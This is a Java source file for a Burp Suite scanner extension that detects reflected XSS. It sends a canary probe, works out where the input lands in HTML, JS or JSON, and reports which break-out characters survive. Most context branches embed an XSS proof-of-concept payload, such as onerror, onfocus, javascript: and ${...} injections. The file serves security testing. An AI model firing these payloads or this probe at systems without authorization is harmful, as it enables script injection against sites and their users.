package burp;

import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;

/**
 * ContextualReflectionEngine
 *
 * A fully contextual reflected-XSS engine modelled on elkokc/reflector's
 * methodology and extended to cover modern applications and JSON/JSONP APIs
 * (which Reflector itself does not handle).
 *
 * Methodology (per insertion point, one probe request -- Reflector's
 * "aggressive mode" analogue):
 *
 *   1. Inject a probe that interleaves a unique alphabetic canary with every
 *      break-out character:  CANARY c0 CANARY c1 CANARY ... c(n-1) CANARY.
 *      The canary is pure [a-z] so it survives every output encoder; splitting
 *      the reflected block on the canary yields, for each special character,
 *      the exact transformation the application applied to it at the point of
 *      reflection (verbatim, HTML-entity-encoded, backslash-escaped, URL-encoded
 *      or stripped).
 *
 *   2. Determine the reflection CONTEXT with a forward HTML/JS tokenizer:
 *      HTML text, HTML comment, tag/attribute-name position, single/double/
 *      unquoted attribute value, URL attribute, event handler, <script> data,
 *      JS single/double/template string, and <style>/CSS -- plus JSON string and
 *      JSONP for API responses.
 *
 *   3. Decide EXPLOITABILITY from the context together with which break-out
 *      characters actually survived, exactly as a human would ("is a { reflected
 *      literally inside this attribute value?"). Only genuine break-outs are
 *      reported, which is what keeps Reflector's false-positive rate low.
 *
 * The result is handed to {@link EnhancedIssueReporter} so findings render
 * identically to the rest of the extension.
 */
public class ContextualReflectionEngine {

    private final IExtensionHelpers helpers;
    private final IBurpExtenderCallbacks callbacks;
    private final Settings settings;
    private final EnhancedIssueReporter reporter;
    private final java.security.SecureRandom rng = new java.security.SecureRandom();

    /**
     * Break-out characters probed, in a fixed order. The transformation applied
     * to each is read back by splitting the reflected block on the canary.
     */
    private static final char[] SPECIALS = {
        '<', '>', '"', '\'', '`', '(', ')', '{', '}', ';', '/', '\\', '=', ':', ' ', '$'
    };

    /** Reflection contexts the engine distinguishes. */
    enum Ctx {
        HTML_TEXT, HTML_COMMENT, TAG_NAME_OR_ATTR, ATTR_DOUBLE, ATTR_SINGLE, ATTR_UNQUOTED,
        ATTR_URL, EVENT_HANDLER, SCRIPT_DATA, SCRIPT_STRING_SINGLE, SCRIPT_STRING_DOUBLE,
        SCRIPT_TEMPLATE, STYLE, JSON_STRING, JSONP, UNKNOWN
    }

    public ContextualReflectionEngine(IExtensionHelpers helpers, IBurpExtenderCallbacks callbacks, Settings settings) {
        this.helpers = helpers;
        this.callbacks = callbacks;
        this.settings = settings;
        this.reporter = new EnhancedIssueReporter(helpers, callbacks, settings);
    }

    /**
     * Run the contextual probe against a single insertion point and return any
     * confirmed/high-confidence reflected-XSS issue found.
     */
    public List<IScanIssue> scan(IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {
        List<IScanIssue> issues = new ArrayList<>();
        if (baseRequestResponse == null || insertionPoint == null) {
            return issues;
        }
        try {
            String tag = randomCanary();
            String probe = buildProbe(tag);

            byte[] probeRequest = insertionPoint.buildRequest(helpers.stringToBytes(probe));
            IHttpRequestResponse probeRR = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), probeRequest);
            if (probeRR == null || probeRR.getResponse() == null) {
                return issues;
            }

            byte[] respBytes = probeRR.getResponse();
            IResponseInfo respInfo = helpers.analyzeResponse(respBytes);
            int bodyOffset = respInfo.getBodyOffset();
            String body = new String(Arrays.copyOfRange(respBytes, bodyOffset, respBytes.length), StandardCharsets.UTF_8);

            MimeInfo mime = classifyMime(respInfo);

            // All reflection sites of the canary.
            List<Integer> sites = indicesOf(body, tag);
            if (sites.isEmpty()) {
                return issues; // input not reflected at all
            }

            Finding best = null;
            for (int siteStart : sites) {
                Finding f = evaluateSite(body, siteStart, tag, probe, mime, insertionPoint, respInfo);
                if (f != null && (best == null || f.confidence > best.confidence)) {
                    best = f;
                }
                // The canary appears n+1 times per reflection; once we have a
                // confident finding there is no value in re-scanning every copy.
                if (best != null && best.confidence >= 95.0) {
                    break;
                }
            }

            if (best != null) {
                IScanIssue issue = buildIssue(probeRR, insertionPoint, tag, probeRequest, respBytes, best);
                if (issue != null) {
                    issues.add(issue);
                }
            }
        } catch (Exception e) {
            if (settings != null && settings.getVerboseLogging()) {
                callbacks.printError("[ContextualReflectionEngine] " + e.getMessage());
            }
        }
        return issues;
    }

    // ------------------------------------------------------------------
    // Probe construction / decoding
    // ------------------------------------------------------------------

    private String randomCanary() {
        // Pure lowercase letters: survives HTML/JS/URL/JSON encoders unchanged
        // and is extremely unlikely to collide with page content.
        StringBuilder sb = new StringBuilder("zq");
        String alphabet = "abcdefghijklmnopqrstuvwxyz";
        for (int i = 0; i < 6; i++) {
            sb.append(alphabet.charAt(rng.nextInt(alphabet.length())));
        }
        return sb.toString();
    }

    /** CANARY c0 CANARY c1 CANARY ... c(n-1) CANARY */
    private String buildProbe(String tag) {
        StringBuilder sb = new StringBuilder(tag);
        for (char c : SPECIALS) {
            sb.append(c).append(tag);
        }
        return sb.toString();
    }

    /**
     * Read back, for each probed special character, how it was transformed at a
     * particular reflection site. Returns a map keyed by the character.
     */
    private Map<Character, CharFate> decodeSurvival(String body, int siteStart, String tag) {
        Map<Character, CharFate> fate = new HashMap<>();
        // Bound the block so an unrelated later canary copy cannot bleed in.
        int blockEnd = Math.min(body.length(), siteStart + tag.length() * (SPECIALS.length + 2) + 64 * SPECIALS.length);
        String block = body.substring(siteStart, blockEnd);
        String[] parts = block.split(java.util.regex.Pattern.quote(tag), -1);
        // parts[0] == "" ; parts[i+1] == transform of SPECIALS[i]
        for (int i = 0; i < SPECIALS.length; i++) {
            char c = SPECIALS[i];
            String t = (i + 1 < parts.length) ? parts[i + 1] : "";
            fate.put(c, classifyFate(c, t));
        }
        return fate;
    }

    private CharFate classifyFate(char c, String transform) {
        CharFate f = new CharFate();
        if (transform == null || transform.isEmpty()) {
            f.stripped = true;
            return f;
        }
        int idx = transform.indexOf(c);
        if (idx >= 0) {
            f.present = true;
            // Unescaped == present and not immediately preceded by a backslash
            // (the distinction that matters inside JS/JSON string contexts).
            f.unescaped = (idx == 0) || transform.charAt(idx - 1) != '\\';
            if (idx > 0 && transform.charAt(idx - 1) == '\\') {
                f.backslashEscaped = true;
            }
        }
        String low = transform.toLowerCase(Locale.ROOT);
        if (low.contains("&lt;") || low.contains("&gt;") || low.contains("&quot;")
                || low.contains("&#39;") || low.contains("&#x27;") || low.contains("&apos;")
                || low.contains("&#x3c;") || low.contains("&#60;") || low.contains("&amp;")) {
            f.htmlEncoded = true;
        }
        if (low.contains("%3c") || low.contains("%3e") || low.contains("%22") || low.contains("%27")) {
            f.urlEncoded = true;
        }
        return f;
    }

    // ------------------------------------------------------------------
    // Context detection (forward HTML/JS tokenizer)
    // ------------------------------------------------------------------

    private static final class CtxResult {
        Ctx ctx = Ctx.UNKNOWN;
        String attrName = "";     // lowercased attribute name when in an attribute
        boolean valueAtStart;     // reflection begins at the attribute value start
    }

    /**
     * Walk the response from the start to {@code pos} and report the parser
     * state at that offset. Deliberately pragmatic but faithful to the real
     * HTML tokenizer transitions that matter for XSS (rawtext for
     * script/style, {@code </script>} terminating a JS string, quoted vs
     * unquoted attribute values, event-handler and URL attributes).
     */
    private CtxResult detectContext(String body, int pos) {
        CtxResult r = new CtxResult();
        final int DATA = 0, TAG = 1, COMMENT = 2, RAW_SCRIPT = 3, RAW_STYLE = 4;
        int mode = DATA;

        String tagName = "";
        String attrName = "";
        boolean inAttrValue = false;   // unquoted value in progress
        char attrQuote = 0;            // 0 = none, else '"' or '\''
        int valueStartPos = -1;        // where the current attr value began
        char jsQuote = 0;              // string quote inside <script>
        boolean jsLineComment = false, jsBlockComment = false;

        int i = 0;
        int n = body.length();
        while (i < pos && i < n) {
            char c = body.charAt(i);
            switch (mode) {
                case DATA: {
                    if (c == '<') {
                        if (body.startsWith("<!--", i)) {
                            mode = COMMENT;
                            i += 4;
                            continue;
                        }
                        int j = i + 1;
                        if (j < n && body.charAt(j) == '/') {
                            j++;
                        }
                        if (j < n && isNameStart(body.charAt(j))) {
                            int s = j;
                            while (j < n && isNameChar(body.charAt(j))) {
                                j++;
                            }
                            tagName = body.substring(s, j).toLowerCase(Locale.ROOT);
                            attrName = "";
                            inAttrValue = false;
                            attrQuote = 0;
                            mode = TAG;
                            i = j;
                            continue;
                        }
                    }
                    i++;
                    break;
                }
                case COMMENT: {
                    if (body.startsWith("-->", i)) {
                        mode = DATA;
                        i += 3;
                        continue;
                    }
                    i++;
                    break;
                }
                case TAG: {
                    if (attrQuote != 0) {
                        if (c == attrQuote) {
                            attrQuote = 0;
                            inAttrValue = false;
                            attrName = "";
                        }
                        i++;
                        break;
                    }
                    if (inAttrValue) { // unquoted value
                        if (c == '>' || isWhite(c)) {
                            inAttrValue = false;
                            attrName = "";
                            if (c == '>') {
                                mode = enterBodyMode(tagName);
                                tagName = "";
                            }
                            i++;
                        } else {
                            i++;
                        }
                        break;
                    }
                    if (c == '>') {
                        mode = enterBodyMode(tagName);
                        tagName = "";
                        i++;
                        break;
                    }
                    if (c == '"' || c == '\'') {
                        attrQuote = c;
                        valueStartPos = i + 1;
                        i++;
                        break;
                    }
                    if (c == '=') {
                        i++;
                        while (i < pos && i < n && isWhite(body.charAt(i))) {
                            i++;
                        }
                        if (i < n && (body.charAt(i) == '"' || body.charAt(i) == '\'')) {
                            attrQuote = body.charAt(i);
                            valueStartPos = i + 1;
                            i++;
                        } else {
                            inAttrValue = true;
                            valueStartPos = i;
                        }
                        break;
                    }
                    if (isWhite(c)) {
                        i++;
                        break;
                    }
                    // attribute name
                    int s = i;
                    while (i < pos && i < n && !isWhite(body.charAt(i)) && body.charAt(i) != '='
                            && body.charAt(i) != '>' && body.charAt(i) != '"' && body.charAt(i) != '\'') {
                        i++;
                    }
                    attrName = body.substring(s, Math.min(i, n)).toLowerCase(Locale.ROOT);
                    break;
                }
                case RAW_SCRIPT: {
                    if ((c == '<') && regionIgnoreCase(body, i, "</script")) {
                        mode = DATA;
                        jsQuote = 0;
                        jsLineComment = false;
                        jsBlockComment = false;
                        i += 2; // step past "</"; DATA will re-read the tag name
                        continue;
                    }
                    if (jsLineComment) {
                        if (c == '\n') {
                            jsLineComment = false;
                        }
                        i++;
                        break;
                    }
                    if (jsBlockComment) {
                        if (c == '*' && i + 1 < n && body.charAt(i + 1) == '/') {
                            jsBlockComment = false;
                            i += 2;
                            continue;
                        }
                        i++;
                        break;
                    }
                    if (jsQuote != 0) {
                        if (c == '\\') {
                            i += 2;
                            continue;
                        }
                        if (c == jsQuote) {
                            jsQuote = 0;
                        }
                        i++;
                        break;
                    }
                    if (c == '/' && i + 1 < n && body.charAt(i + 1) == '/') {
                        jsLineComment = true;
                        i += 2;
                        continue;
                    }
                    if (c == '/' && i + 1 < n && body.charAt(i + 1) == '*') {
                        jsBlockComment = true;
                        i += 2;
                        continue;
                    }
                    if (c == '"' || c == '\'' || c == '`') {
                        jsQuote = c;
                        i++;
                        break;
                    }
                    i++;
                    break;
                }
                case RAW_STYLE: {
                    if ((c == '<') && regionIgnoreCase(body, i, "</style")) {
                        mode = DATA;
                        i += 2;
                        continue;
                    }
                    i++;
                    break;
                }
                default:
                    i++;
            }
        }

        // Translate the terminal parser state into a context.
        switch (mode) {
            case COMMENT:
                r.ctx = Ctx.HTML_COMMENT;
                return r;
            case RAW_STYLE:
                r.ctx = Ctx.STYLE;
                return r;
            case RAW_SCRIPT:
                if (jsQuote == '`') {
                    r.ctx = Ctx.SCRIPT_TEMPLATE;
                } else if (jsQuote == '\'') {
                    r.ctx = Ctx.SCRIPT_STRING_SINGLE;
                } else if (jsQuote == '"') {
                    r.ctx = Ctx.SCRIPT_STRING_DOUBLE;
                } else {
                    r.ctx = Ctx.SCRIPT_DATA;
                }
                return r;
            case TAG:
                r.attrName = attrName;
                r.valueAtStart = (valueStartPos == pos);
                if (attrQuote == '"' || attrQuote == '\'') {
                    if (isEventHandler(attrName)) {
                        r.ctx = Ctx.EVENT_HANDLER;
                    } else if (isUrlAttr(attrName)) {
                        r.ctx = Ctx.ATTR_URL;
                    } else {
                        r.ctx = (attrQuote == '"') ? Ctx.ATTR_DOUBLE : Ctx.ATTR_SINGLE;
                    }
                } else if (inAttrValue) {
                    if (isEventHandler(attrName)) {
                        r.ctx = Ctx.EVENT_HANDLER;
                    } else if (isUrlAttr(attrName)) {
                        r.ctx = Ctx.ATTR_URL;
                    } else {
                        r.ctx = Ctx.ATTR_UNQUOTED;
                    }
                } else {
                    // Between/at attribute names: a new attribute (and event
                    // handler) can be introduced -- a very strong position.
                    r.ctx = Ctx.TAG_NAME_OR_ATTR;
                }
                return r;
            default:
                r.ctx = Ctx.HTML_TEXT;
                return r;
        }
    }

    private int enterBodyMode(String tagName) {
        if ("script".equals(tagName)) {
            return 3; // RAW_SCRIPT
        }
        if ("style".equals(tagName)) {
            return 4; // RAW_STYLE
        }
        return 0; // DATA
    }

    // ------------------------------------------------------------------
    // Exploitability evaluation
    // ------------------------------------------------------------------

    private Finding evaluateSite(String body, int siteStart, String tag, String probe,
                                 MimeInfo mime, IScannerInsertionPoint ip, IResponseInfo respInfo) {
        Map<Character, CharFate> fate = decodeSurvival(body, siteStart, tag);

        // JSON / JSONP responses take the structured-data path.
        if (mime.isJson || mime.isJavaScript) {
            Finding jf = evaluateJson(body, siteStart, tag, fate, mime);
            if (jf != null) {
                return jf;
            }
            // JSON that is not html-renderable and not JSONP is not directly
            // exploitable; fall through only if it is html-renderable.
            if (!mime.htmlRenderable) {
                return null;
            }
        }

        CtxResult c = detectContext(body, siteStart);
        return evaluateHtml(c, fate, mime);
    }

    private Finding evaluateHtml(CtxResult c, Map<Character, CharFate> fate, MimeInfo mime) {
        boolean lt = present(fate, '<');
        boolean gt = present(fate, '>');
        boolean sp = present(fate, ' ');
        boolean slash = present(fate, '/');

        switch (c.ctx) {
            case HTML_TEXT: {
                if (lt && gt) {
                    return confirmed(c.ctx, "HTML text", 100.0,
                            "<img src=x onerror=alert(1)>",
                            "The characters < and > are reflected unencoded in HTML text, allowing arbitrary tag injection.");
                }
                if (lt) {
                    return confirmed(c.ctx, "HTML text", 90.0,
                            "<svg onload=alert(1)>",
                            "< is reflected unencoded in HTML text; a tag can be injected (browser auto-completes the markup).");
                }
                return null;
            }
            case HTML_COMMENT: {
                if (gt && lt) {
                    return confirmed(c.ctx, "HTML comment", 85.0,
                            "--><img src=x onerror=alert(1)>",
                            "The comment can be closed with --> and a new tag injected (< and > survive).");
                }
                return null;
            }
            case TAG_NAME_OR_ATTR: {
                if (sp) {
                    return confirmed(c.ctx, "Tag / attribute-name position", 98.0,
                            " autofocus onfocus=alert(1) ",
                            "Reflection sits where a new attribute can be added; an event-handler attribute injects JavaScript.");
                }
                if (gt && lt) {
                    return confirmed(c.ctx, "Tag / attribute-name position", 95.0,
                            "><img src=x onerror=alert(1)>",
                            "The tag can be closed with > and a new element injected.");
                }
                return null;
            }
            case ATTR_DOUBLE: {
                boolean q = unescaped(fate, '"');
                if (q && (lt && gt)) {
                    return confirmed(c.ctx, "Double-quoted attribute", 100.0,
                            "\"><img src=x onerror=alert(1)>",
                            "The double quote is reflected unencoded, breaking out of the attribute, and < > allow tag injection.");
                }
                if (q && sp) {
                    return confirmed(c.ctx, "Double-quoted attribute", 95.0,
                            "\" autofocus onfocus=alert(1) x=\"",
                            "The double quote breaks out of the attribute value, and a new event-handler attribute can be added.");
                }
                if (q) {
                    return tentative(c.ctx, "Double-quoted attribute", 55.0,
                            "\"><img src=x onerror=alert(1)>",
                            "The double quote is reflected unencoded; break-out is possible though < > or whitespace were restricted.");
                }
                return null;
            }
            case ATTR_SINGLE: {
                boolean q = unescaped(fate, '\'');
                if (q && (lt && gt)) {
                    return confirmed(c.ctx, "Single-quoted attribute", 100.0,
                            "'><img src=x onerror=alert(1)>",
                            "The single quote is reflected unencoded, breaking out of the attribute, and < > allow tag injection.");
                }
                if (q && sp) {
                    return confirmed(c.ctx, "Single-quoted attribute", 95.0,
                            "' autofocus onfocus=alert(1) x='",
                            "The single quote breaks out of the attribute value, and a new event-handler attribute can be added.");
                }
                if (q) {
                    return tentative(c.ctx, "Single-quoted attribute", 55.0,
                            "'><img src=x onerror=alert(1)>",
                            "The single quote is reflected unencoded; break-out is possible though < > or whitespace were restricted.");
                }
                return null;
            }
            case ATTR_UNQUOTED: {
                if (sp) {
                    return confirmed(c.ctx, "Unquoted attribute", 97.0,
                            " onmouseover=alert(1) ",
                            "The value is unquoted and whitespace survives, so an event-handler attribute can be appended directly.");
                }
                if (gt && lt) {
                    return confirmed(c.ctx, "Unquoted attribute", 95.0,
                            "><img src=x onerror=alert(1)>",
                            "The unquoted value can be terminated with > and a new element injected.");
                }
                return null;
            }
            case ATTR_URL: {
                boolean colon = present(fate, ':');
                if (c.valueAtStart && colon) {
                    return confirmed(c.ctx, "URL attribute (scheme)", 92.0,
                            "javascript:alert(1)",
                            "The value controls the start of a URL-bearing attribute; the javascript: scheme executes on activation.");
                }
                boolean q = unescaped(fate, '"') || unescaped(fate, '\'');
                if (q && lt && gt) {
                    return confirmed(c.ctx, "URL attribute", 90.0,
                            "\"><img src=x onerror=alert(1)>",
                            "The quote delimiting the URL attribute is reflected unencoded, allowing break-out and tag injection.");
                }
                return null;
            }
            case EVENT_HANDLER: {
                // Already a JavaScript execution context.
                boolean q = unescaped(fate, '"') || unescaped(fate, '\'');
                if (q) {
                    return confirmed(c.ctx, "Event handler (JS)", 98.0,
                            "';alert(1);//",
                            "The reflection is inside an on* event-handler value and the surrounding quote is reflected unencoded, so JavaScript can be injected.");
                }
                return confirmed(c.ctx, "Event handler (JS)", 90.0,
                        "-alert(1)-",
                        "The reflection is inside an on* event-handler value (JavaScript execution context).");
            }
            case SCRIPT_DATA: {
                if (lt && slash) {
                    return confirmed(c.ctx, "Inline <script> block", 100.0,
                            "</script><img src=x onerror=alert(1)>",
                            "The reflection is in an inline script block; </script> closes it and a new element is injected.");
                }
                return confirmed(c.ctx, "Inline <script> block", 97.0,
                        ";alert(1);//",
                        "The reflection is directly inside an inline <script> block (JavaScript execution context).");
            }
            case SCRIPT_STRING_DOUBLE: {
                if (unescaped(fate, '"')) {
                    return confirmed(c.ctx, "JavaScript string (double-quoted)", 98.0,
                            "\";alert(1);//",
                            "The double quote is reflected unescaped inside a JavaScript string literal, allowing the string to be broken and code injected.");
                }
                if (lt && slash) {
                    return confirmed(c.ctx, "JavaScript string (double-quoted)", 90.0,
                            "</script><img src=x onerror=alert(1)>",
                            "The JS string cannot be broken directly, but </script> terminates the script element (< and / survive) allowing tag injection.");
                }
                return null;
            }
            case SCRIPT_STRING_SINGLE: {
                if (unescaped(fate, '\'')) {
                    return confirmed(c.ctx, "JavaScript string (single-quoted)", 98.0,
                            "';alert(1);//",
                            "The single quote is reflected unescaped inside a JavaScript string literal, allowing the string to be broken and code injected.");
                }
                if (lt && slash) {
                    return confirmed(c.ctx, "JavaScript string (single-quoted)", 90.0,
                            "</script><img src=x onerror=alert(1)>",
                            "The JS string cannot be broken directly, but </script> terminates the script element (< and / survive) allowing tag injection.");
                }
                return null;
            }
            case SCRIPT_TEMPLATE: {
                boolean dollar = present(fate, '$');
                boolean ob = present(fate, '{');
                boolean cb = present(fate, '}');
                if (dollar && ob && cb) {
                    return confirmed(c.ctx, "JavaScript template literal", 98.0,
                            "${alert(1)}",
                            "Inside a template literal, ${...} is evaluated as JavaScript and the required characters survive.");
                }
                if (unescaped(fate, '`')) {
                    return confirmed(c.ctx, "JavaScript template literal", 95.0,
                            "`;alert(1);//",
                            "The backtick is reflected unescaped, breaking out of the template literal.");
                }
                return null;
            }
            case STYLE: {
                if (lt && slash) {
                    return confirmed(c.ctx, "Inline <style> block", 85.0,
                            "</style><img src=x onerror=alert(1)>",
                            "The reflection is inside a style block; </style> closes it (< and / survive) allowing tag injection.");
                }
                return null;
            }
            default:
                return null;
        }
    }

    /**
     * JSON / JSONP evaluation -- the capability Reflector lacks. Decides whether
     * a reflection inside a JSON response is actually reachable as script.
     */
    private Finding evaluateJson(String body, int siteStart, String tag,
                                 Map<Character, CharFate> fate, MimeInfo mime) {
        // 1) JSONP: the reflected value is used as a callback function name and
        //    is immediately followed by "(" -- direct JavaScript execution.
        int blockEnd = Math.min(body.length(), siteStart + tag.length() * (SPECIALS.length + 2) + 64 * SPECIALS.length);
        String block = body.substring(siteStart, blockEnd);
        String[] parts = block.split(java.util.regex.Pattern.quote(tag), -1);
        String after = parts.length > 0 ? parts[parts.length - 1] : "";
        boolean nearStart = siteStart <= firstNonWhitespace(body) + 2;
        if ((mime.isJavaScript || mime.isJson) && nearStart && after.trim().startsWith("(")) {
            Finding f = confirmed(Ctx.JSONP, "JSONP callback", 95.0,
                    "alert(1)",
                    "The response is JSONP: the reflected parameter is used as the callback function name and executed directly. "
                    + "Set the callback parameter to arbitrary JavaScript (or a call such as alert(1)).");
            f.isJson = true;
            return f;
        }

        boolean lt = present(fate, '<');
        boolean gt = present(fate, '>');

        // 2) JSON served so a browser will render it as HTML (wrong/again
        //    sniffable Content-Type) with < > surviving -> real reflected XSS.
        if (mime.htmlRenderable && lt && gt) {
            Finding f = confirmed(Ctx.JSON_STRING, "JSON rendered as HTML", 90.0,
                    "<img src=x onerror=alert(1)>",
                    "The JSON body is served with a Content-Type a browser treats as HTML (" + mime.describe()
                    + ") and < > are reflected unencoded, so injected markup executes. Serve application/json with X-Content-Type-Options: nosniff.");
            f.isJson = true;
            return f;
        }

        // 3) Strict application/json. In modern browsers this is not directly
        //    renderable; report only when the JSON string can be broken AND
        //    sniffing is not blocked, as a lower-confidence note.
        boolean quoteBreak = unescaped(fate, '"');
        if (mime.isJson && !mime.nosniff && quoteBreak && lt) {
            Finding f = tentative(Ctx.JSON_STRING, "JSON string break-out (sniffing risk)", 50.0,
                    "\"></script><img src=x onerror=alert(1)>",
                    "The JSON string delimiter (\") is reflected unescaped and < survives, and the response lacks "
                    + "X-Content-Type-Options: nosniff. Legacy/content-sniffing clients, or any consumer that injects this value "
                    + "into the DOM, may execute it. Escape output and send nosniff.");
            f.isJson = true;
            return f;
        }
        return null;
    }

    // ------------------------------------------------------------------
    // Issue construction
    // ------------------------------------------------------------------

    private IScanIssue buildIssue(IHttpRequestResponse probeRR, IScannerInsertionPoint ip, String tag,
                                  byte[] probeRequest, byte[] probeResponse, Finding f) {
        Map<String, Object> vd = new HashMap<>();
        vd.put("paramName", ip.getInsertionPointName());
        vd.put("payload", f.poc);
        vd.put("INJECTED_PAYLOAD", f.poc);
        vd.put("REFLECTION_CONTEXT", f.contextLabel);
        vd.put("CONFIDENCE_SCORE", f.confidence);
        vd.put("CONFIRMED_XSS", f.confirmed);
        vd.put("IS_JSON_RESPONSE", f.isJson);
        vd.put("CONTEXT_EVIDENCE", f.reason);
        vd.put("TEST_REQUEST", probeRequest);
        vd.put("TEST_RESPONSE", probeResponse);
        List<String> highlight = new ArrayList<>();
        highlight.add(tag);
        vd.put("HIGHLIGHT_TERMS", highlight);
        return reporter.createXSSIssue(probeRR, vd);
    }

    // ------------------------------------------------------------------
    // Small helpers
    // ------------------------------------------------------------------

    private Finding confirmed(Ctx ctx, String label, double conf, String poc, String reason) {
        Finding f = new Finding();
        f.ctx = ctx;
        f.contextLabel = label;
        f.confidence = conf;
        f.confirmed = true;
        f.poc = poc;
        f.reason = reason;
        return f;
    }

    private Finding tentative(Ctx ctx, String label, double conf, String poc, String reason) {
        Finding f = new Finding();
        f.ctx = ctx;
        f.contextLabel = label;
        f.confidence = conf;
        f.confirmed = false;
        f.poc = poc;
        f.reason = reason;
        return f;
    }

    private boolean present(Map<Character, CharFate> fate, char c) {
        CharFate f = fate.get(c);
        return f != null && f.present;
    }

    private boolean unescaped(Map<Character, CharFate> fate, char c) {
        CharFate f = fate.get(c);
        return f != null && f.present && f.unescaped;
    }

    private static boolean isWhite(char c) {
        return c == ' ' || c == '\t' || c == '\n' || c == '\r' || c == '\f';
    }

    private static boolean isNameStart(char c) {
        return (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z');
    }

    private static boolean isNameChar(char c) {
        return isNameStart(c) || (c >= '0' && c <= '9') || c == '-' || c == ':';
    }

    private static boolean isEventHandler(String attr) {
        return attr != null && attr.length() > 2 && attr.startsWith("on");
    }

    private static boolean isUrlAttr(String attr) {
        if (attr == null) {
            return false;
        }
        switch (attr) {
            case "href":
            case "src":
            case "action":
            case "formaction":
            case "xlink:href":
            case "poster":
            case "data":
            case "background":
            case "cite":
            case "ping":
                return true;
            default:
                return false;
        }
    }

    private static boolean regionIgnoreCase(String s, int at, String needle) {
        return s.regionMatches(true, at, needle, 0, needle.length());
    }

    private static int firstNonWhitespace(String s) {
        for (int i = 0; i < s.length(); i++) {
            if (!isWhite(s.charAt(i))) {
                return i;
            }
        }
        return 0;
    }

    private List<Integer> indicesOf(String haystack, String needle) {
        List<Integer> out = new ArrayList<>();
        int from = 0;
        while (true) {
            int idx = haystack.indexOf(needle, from);
            if (idx < 0) {
                break;
            }
            out.add(idx);
            // Skip the whole probe block so we land on the next *reflection*,
            // not the interleaved canary copies within one probe.
            from = idx + needle.length();
            // Advance past consecutive canary copies belonging to the same probe.
            int guard = 0;
            while (guard < SPECIALS.length + 1) {
                int next = haystack.indexOf(needle, from);
                if (next < 0 || next - from > 64) {
                    break;
                }
                from = next + needle.length();
                guard++;
            }
        }
        return out;
    }

    private MimeInfo classifyMime(IResponseInfo respInfo) {
        MimeInfo m = new MimeInfo();
        String ct = "";
        try {
            for (String h : respInfo.getHeaders()) {
                String low = h.toLowerCase(Locale.ROOT);
                if (low.startsWith("content-type:")) {
                    ct = low.substring("content-type:".length()).trim();
                }
                if (low.startsWith("x-content-type-options:") && low.contains("nosniff")) {
                    m.nosniff = true;
                }
            }
        } catch (Exception ignored) {
            // headers unavailable
        }
        m.contentType = ct;
        String stated = safeLower(respInfo.getStatedMimeType());
        String inferred = safeLower(respInfo.getInferredMimeType());
        m.isJson = ct.contains("json") || stated.contains("json") || ct.contains("+json");
        m.isJavaScript = ct.contains("javascript") || ct.contains("ecmascript")
                || stated.contains("script") || ct.contains("text/js");
        boolean declaredHtml = ct.contains("text/html") || ct.contains("application/xhtml")
                || ct.isEmpty() || ct.contains("text/plain");
        // If the declared type is html-ish, or the body sniffs as HTML and
        // nothing forbids sniffing, a browser may render it as a document.
        m.htmlRenderable = declaredHtml || (inferred.contains("html") && !m.nosniff);
        if (m.isJson && m.nosniff) {
            m.htmlRenderable = false; // strict json, sniffing blocked
        }
        return m;
    }

    private static String safeLower(String s) {
        return s == null ? "" : s.toLowerCase(Locale.ROOT);
    }

    // ------------------------------------------------------------------
    // Value objects
    // ------------------------------------------------------------------

    private static final class CharFate {
        boolean present;          // literal character appears in the reflection
        boolean unescaped;        // appears without a preceding backslash
        boolean backslashEscaped; // appears but backslash-escaped
        boolean htmlEncoded;      // entity-encoded form present
        boolean urlEncoded;       // percent-encoded form present
        boolean stripped;         // nothing reflected for this character
    }

    private static final class MimeInfo {
        String contentType = "";
        boolean isJson;
        boolean isJavaScript;
        boolean htmlRenderable;
        boolean nosniff;

        String describe() {
            String ct = contentType == null || contentType.isEmpty() ? "no Content-Type" : contentType;
            return ct + (nosniff ? "; nosniff" : "");
        }
    }

    private static final class Finding {
        Ctx ctx;
        String contextLabel;
        double confidence;
        boolean confirmed;
        boolean isJson;
        String poc;
        String reason;
    }
}
